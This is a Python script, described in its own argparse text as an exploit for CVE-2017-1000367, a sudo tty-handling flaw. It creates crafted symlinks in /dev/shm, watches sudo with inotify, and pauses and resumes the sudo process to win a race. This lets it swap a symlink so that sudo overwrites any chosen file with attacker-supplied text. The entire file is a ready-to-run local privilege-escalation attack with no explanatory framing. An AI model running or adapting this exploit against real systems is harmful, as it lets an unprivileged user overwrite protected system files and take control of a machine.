import os, subprocess, time, re, signal, argparse
from threading import Thread

import logging
import inotify.adapters

_DEFAULT_LOG_FORMAT = '%(asctime)s - %(name)s - %(levelname)s - %(message)s'
_LOGGER = logging.getLogger(__name__)

def _configure_logging():
    _LOGGER.setLevel(logging.DEBUG)

    ch = logging.StreamHandler()

    formatter = logging.Formatter(_DEFAULT_LOG_FORMAT)
    ch.setFormatter(formatter)

    _LOGGER.addHandler(ch)


def f_inotify():
    _configure_logging()
    i = inotify.adapters.Inotify()

    folder_to_watch = b'/dev/shm/_tmp/'
    i.add_watch(folder_to_watch)

    m = []
    s = []
    d = []

    for j in range(57):
        m.append(0)
        s.append(0)
        d.append(0)

    try:
        for event in i.event_gen():
            if event is not None:
                os.kill(asd_PID, signal.SIGSTOP)
                (header, type_names, watch_path, filename) = event
                _LOGGER.info("WD=(%d) MASK=(%d) COOKIE=(%d) LEN=(%d) MASK->NAMES=%s "
                             "WATCH-PATH=[%s] FILENAME=[%s]",
                             header.wd, header.mask, header.cookie, header.len, type_names,
                             watch_path.decode('utf-8'), filename.decode('utf-8'))
                if re.search("IN_OPEN", str(type_names)) and not filename.decode('utf-8'):
                    os.kill(asd_PID, signal.SIGSTOP)

                    for j in range(57):
                       m[j],s[j] = os.openpty()
                    os.kill(asd_PID, signal.SIGCONT)
                if re.search("IN_CLOSE_NOWRITE", str(type_names)) and not filename.decode('utf-8'):
                    os.kill(asd_PID, signal.SIGSTOP)
                    subprocess.Popen("unlink /dev/shm/_tmp/_tty", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()
                    subprocess.Popen("ln -s {} /dev/shm/_tmp/_tty".format(args.file), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()
                    #time.sleep(10)
                    os.kill(asd_PID, signal.SIGCONT)
                    # I don't yet understand why this sleep is needed
                    time.sleep(1)
    finally:
        i.remove_watch(folder_to_watch)


def init():
    # rm /dev/shm/_tmp folder
    subprocess.Popen("rm -rf /dev/shm/_tmp/", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()
    # mkdir /dev/shm/_tmp
    subprocess.Popen("mkdir -m 0755 /dev/shm/_tmp/", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()
    # create link "/dev/shm/_tmp/_tty" to nonexistent /dev/pts/57
    subprocess.Popen("ln -s /dev/pts/57 /dev/shm/_tmp/_tty", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()
    # create link "/dev/shm/_tmp/     34873 " to /usr/bin/sudo
    subprocess.Popen("ln -s /usr/bin/sudo '/dev/shm/_tmp/     34873 '", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()

def teardown():
    # rm /dev/shm/_tmp folder
    subprocess.Popen("rm -rf /dev/shm/_tmp/", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()


parser = argparse.ArgumentParser(description='python exploit for CVE-2017-1000367')
parser.add_argument('--file', '-f', default='/etc/motd', help='file to override')
parser.add_argument('--string', '-s', default='--\nHELLO\nWORLD\n', help='string to overwrite with')
parser.add_argument('--binary', '-b', default='/usr/bin/sum', help='binary to use sudo with')
args = parser.parse_args()


init()
try:
    inotify_thread = Thread(target=f_inotify)
    inotify_thread.setDaemon(True)
    inotify_thread.start()

    os.sched_setscheduler(0, os.SCHED_IDLE, os.sched_getparam(0))

    print(os.sched_getaffinity(0))
    os.sched_setaffinity(0, os.sched_getaffinity(0))
    os.nice(19)

    time.sleep(2)
    print("starting")

    asd = subprocess.Popen("/dev/shm/_tmp/\\ \\ \\ \\ \\ 34873\\  -r unconfined_r {} '{}'".format(args.binary, args.string), shell=True)
    asd_PID = asd.pid
    stdout, stderr = asd.communicate()
    #print(stdout)
    #print(stderr)
finally:
    teardown()
